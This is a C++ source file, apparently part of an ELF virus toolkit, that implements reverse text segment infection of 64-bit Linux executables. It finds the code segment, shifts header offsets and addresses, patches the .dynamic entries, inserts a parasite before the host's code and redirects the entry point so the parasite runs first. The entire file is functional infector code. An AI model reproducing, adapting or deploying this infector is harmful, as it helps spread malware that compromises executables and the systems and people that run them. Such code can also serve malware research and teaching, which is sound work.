#include "infector/reverse_text_infect.hh"
#include <elf.h>
#include "common/file_descriptor.hh"
#include "common/patch_pattern.hh"
#include "common/redirect_elf_entry_point.hh"
#include "nostdlib/stdio.hh"
#include "nostdlib/string.hh"

namespace vt::infector {
namespace {
uint64_t round_up_to_page(uint64_t v) { return (v & ~(4096 - 1)) + 4096; }

bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
               size_t padded_virus_size,
               Elf64_Off original_code_segment_file_offset,
               Elf64_Addr original_code_segment_p_vaddr) {
  // Point shdr (Pointer to iterate over SHT)
  auto section_entry_start = &shdr;

  for (auto cur_entry = section_entry_start;
       cur_entry < section_entry_start + ehdr.e_shnum; ++cur_entry) {
    if (cur_entry->sh_type == SHT_NULL) {
      continue;
    }
    // Shift file offset for sections to accommodate virus
    if (cur_entry->sh_offset >= original_code_segment_file_offset) {
      cur_entry->sh_offset += padded_virus_size;
    }
    // Shift V Address
    if (cur_entry->sh_addr &&
        cur_entry->sh_addr <= original_code_segment_p_vaddr) {
      cur_entry->sh_addr -= padded_virus_size;
    }
  }
  return true;
}

// On some arch, the CODE segment would map from the start of the elf (aarch64)
// which results in less LOAD entries. But some would have multiple LOAD entries
// precedding CODE, and only map what's necessary to have execution bit (x86).
// for example:
//    Type Offset   VirtAddr            FileSiz           Flg
//    LOAD 0x000000 0x0000000000400000  0x002518  R   0x1000
//    LOAD 0x003000 0x0000000000403000  0x0573f1  RE  0x1000 <-- CODE
//    LOAD 0x05b000 0x000000000045b000  0x0844d0  R   0x1000
//    LOAD 0x0dfb00 0x00000000004e0b00  0x002550  RW  0x1000
// Since we must insert virus to the begining of CODE, the virus insertion
// offset is the original CODE start offset, and all phdr entry offsets after
// CODE will be shifted back. All entries before and including CODE must shift
// vaddr forward.
//
//    LOAD 0x000000 0x0000000000400000  0x0d2910  RE  0x10000 <-- CODE
//    LOAD 0x0d2910 0x00000000004e2910  0x002d18  RW  0x10000
// In this example, the CODE starts from the begining, including the ehdr and
// phdr We need to leave elf header intact and therefore, the virus must be
// inserted after ehdr but before the phdr, and all phdr entry offsets after
// CODE will be shifted back.
//
void patch_phdr(const Elf64_Ehdr& ehdr, Elf64_Phdr& phdr,
                uint64_t padded_virus_size,
                Elf64_Off original_code_segment_file_offset,
                Elf64_Addr original_code_segment_p_vaddr,
                size_t code_segment_idx) {
  auto pht_entry_count = ehdr.e_phnum;

  // Point to first phdr
  auto phdr_entry = &phdr;
  // For other entries that has p_offset after CODE segment, shift them.
  for (size_t idx = 0; idx < pht_entry_count; idx++) {
    auto cur_entry = phdr_entry + idx;
    // Shift file offset for all segments that are after and including CODE.
    if (cur_entry->p_offset > original_code_segment_file_offset) {
      cur_entry->p_offset += padded_virus_size;
    }

    // Shift vaddr for all segments that are before and including CODE.
    if (cur_entry->p_vaddr <= original_code_segment_p_vaddr) {
      if (cur_entry->p_vaddr) {
        cur_entry->p_vaddr -= padded_virus_size;
      }
      if (cur_entry->p_paddr) {
        cur_entry->p_paddr -= padded_virus_size;
      }
    }

    // Handle CODE segment
    if (idx == code_segment_idx) {
      // extending CODE segment backwards.
      cur_entry->p_filesz += padded_virus_size;
      cur_entry->p_memsz += padded_virus_size;
    }
  }
}

void patch_ehdr(Elf64_Ehdr& ehdr, Elf64_Addr original_code_segment_p_vaddr,
                Elf64_Off original_code_segment_file_offset,
                uint64_t padded_virus_size) {
  if (ehdr.e_type == ET_EXEC) {
    ehdr.e_entry = original_code_segment_p_vaddr - padded_virus_size;
    // virus inserted after ehdr.
    if (original_code_segment_file_offset == 0) {
      ehdr.e_entry += sizeof(Elf64_Ehdr);
    }
  } else {
    vt::printf("DYN not supported\n");
    CHECK_FAIL();
    // ehdr.e_entry = info.original_code_segment_file_offset -
    // padded_virus_size;
  }
  // section header always comes after the virus.
  ehdr.e_shoff += padded_virus_size;

  if (original_code_segment_file_offset == 0) {
    // This means CODE starts from offset 0 and virus is inserted after ehdr but
    // before phdr. otherwise, virus is inserted after phdr.
    ehdr.e_phoff += padded_virus_size;
  }
}

bool does_entry_contain_address(Elf64_Xword tag) {
  // TODO: fix header includes.
  // https://codebrowser.dev/glibc/glibc/elf/elf.h.html
  // https://docs.oracle.com/cd/E23824_01/html/819-0690/chapter6-42444.html
  // gnu elf header has more than kernel header we just want to patch those that
  // have d_ptr.
  return (tag >= DT_PLTGOT && tag <= DT_RELA) || tag == DT_INIT ||
         tag == DT_FINI || tag == DT_REL || tag == DT_DEBUG ||
         tag == DT_JMPREL || tag == 25 || tag == 26 || tag == 32 ||
         (tag >= 0x6ffffe00 && tag <= 0x6ffffeff)  // this range uses d_ptr
         || tag == DT_VERDEF || tag == DT_VERNEED ||
         tag == DT_VERSYM;  // sun extension
}

// The dynamic section is generated if the host participates in dynamic linking
// and it includes various information to support it. For example, the
// DT_GNU_HASH entry for fast symbol lookup, which points to the starting vaddr
// of the .gnu.hash section, if moved forwarded to accomadate our virus, must be
// patched accordingly. This function searches through all entries in .dynamic
// section and shift those pointers forward if they have a smaller vaddr than
// the firs byte of CODE (where we insert the virus).
bool patch_dyamic(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
                  const Elf64_Ehdr& ehdr, const Elf64_Shdr& shdr,
                  Elf64_Off original_code_segment_file_offset,
                  Elf64_Addr original_code_segment_p_vaddr,
                  uint64_t padded_virus_size) {
  if (original_code_segment_file_offset == 0) {
    // if there is no vaddr adjustment to gnu hash section, skip.
    return true;
  }

  auto section_entry_start = &shdr;

  for (auto cur_entry = section_entry_start;
       cur_entry < section_entry_start + ehdr.e_shnum; ++cur_entry) {
    if (cur_entry->sh_type == SHT_DYNAMIC) {
      auto* dynamic_section_entry = reinterpret_cast<Elf64_Dyn*>(
          host_mapping.mutable_base() + cur_entry->sh_offset);
      // look at all entries in .dynamic section until the last DT_NULL is
      // reached. If the entry is an address and is smaller than CODE start, we
      // have shifted it forward. Adjust values here.
      // Debug with: readelf -dW
      while (dynamic_section_entry->d_tag != DT_NULL) {
        if (does_entry_contain_address(dynamic_section_entry->d_tag)) {
          if (dynamic_section_entry->d_un.d_ptr <
              original_code_segment_p_vaddr) {
            dynamic_section_entry->d_un.d_ptr -= padded_virus_size;
          }
        }
        dynamic_section_entry++;
      }
      return true;
    }
  }
  return false;
}

size_t inject_virus(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
                    const vt::common::Mmap<PROT_READ>& parasite_mapping,
                    const Elf64_Ehdr& ehdr, uint64_t padded_virus_size,
                    Elf64_Off original_code_segment_file_offset) {
  Elf64_Addr virus_insert_offset = original_code_segment_file_offset;
  if (virus_insert_offset == 0) {
    // If CODE includes ehdr, inject after it.
    virus_insert_offset += sizeof(Elf64_Ehdr);
  }

  // Shift old content back.
  vt::memcpy(
      host_mapping.mutable_base() + virus_insert_offset + padded_virus_size,
      host_mapping.mutable_base() + virus_insert_offset,
      host_mapping.size() - padded_virus_size - virus_insert_offset);
  // Clear old content. Not required.
  vt::memset(host_mapping.mutable_base() + virus_insert_offset, 0x00,
             padded_virus_size);

  // Inject the virus.
  vt::memcpy(host_mapping.mutable_base() + virus_insert_offset,
             parasite_mapping.base(), parasite_mapping.size());

  return virus_insert_offset;
}

}  // namespace

bool ReverseTextInfect::inject(
    vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
    vt::common::Mmap<PROT_READ> parasite_mapping) {
  const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());

  auto padded_virus_size = round_up_to_page(parasite_mapping.size());

  {
    const auto& shdr = *reinterpret_cast<const Elf64_Shdr*>(
        host_mapping.mutable_base() + ehdr.e_shoff);
    // Patch .dynamic section if we touched .gnu.hash
    patch_dyamic(host_mapping, ehdr, shdr, original_code_segment_file_offset_,
                 original_code_segment_p_vaddr_, padded_virus_size);
  }

  {
    auto& mutable_phdr = *reinterpret_cast<Elf64_Phdr*>(
        host_mapping.mutable_base() + ehdr.e_phoff);
    patch_phdr(ehdr, mutable_phdr, padded_virus_size,
               original_code_segment_file_offset_,
               original_code_segment_p_vaddr_, code_segment_idx_);
  }

  {
    auto& mutable_shdr = *reinterpret_cast<Elf64_Shdr*>(
        host_mapping.mutable_base() + ehdr.e_shoff);
    patch_sht(ehdr, mutable_shdr, padded_virus_size,
              original_code_segment_file_offset_,
              original_code_segment_p_vaddr_);
  }

  {
    // Patch elf header last
    auto& mutable_ehdr =
        *reinterpret_cast<Elf64_Ehdr*>(host_mapping.mutable_base());
    patch_ehdr(mutable_ehdr, original_code_segment_p_vaddr_,
               original_code_segment_file_offset_, padded_virus_size);
  }

  auto virus_offset =
      inject_virus(host_mapping, parasite_mapping, ehdr, padded_virus_size,
                   original_code_segment_file_offset_);

  // Patch parasite to resume host code after execution.
  return redirect_elf_entry_point(ehdr.e_type, original_e_entry_, ehdr.e_entry,
                                  virus_offset, parasite_mapping.size(),
                                  host_mapping);
}

bool ReverseTextInfect::analyze(
    const common::Mmap<PROT_READ>& host_mapping,
    const common::Mmap<PROT_READ>& parasite_mapping) {
  host_size_ = host_mapping.size();
  parasite_size_ = parasite_mapping.size();

  const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());

  if ((ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) ||
      ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
    return false;
  }

  const auto& phdr =
      *reinterpret_cast<const Elf64_Phdr*>(host_mapping.base() + ehdr.e_phoff);

  original_e_entry_ = ehdr.e_entry;
  // Point to first entry in PHT
  const Elf64_Phdr* phdr_entry = &phdr;

  // Parse PHT entries
  for (size_t i = 0; i < ehdr.e_phnum; ++i, ++phdr_entry) {
    // Find the CODE Segment (containing RX section)
    if (phdr_entry->p_type == PT_LOAD && phdr_entry->p_flags == (PF_R | PF_X)) {
      code_segment_idx_ = i;
      original_code_segment_p_vaddr_ = phdr_entry->p_vaddr;
      original_code_segment_file_offset_ = phdr_entry->p_offset;
      return true;
    }
  }

  return false;
}

size_t ReverseTextInfect::injected_host_size() {
  return host_size_ + round_up_to_page(parasite_size_);
}

}  // namespace vt::infector
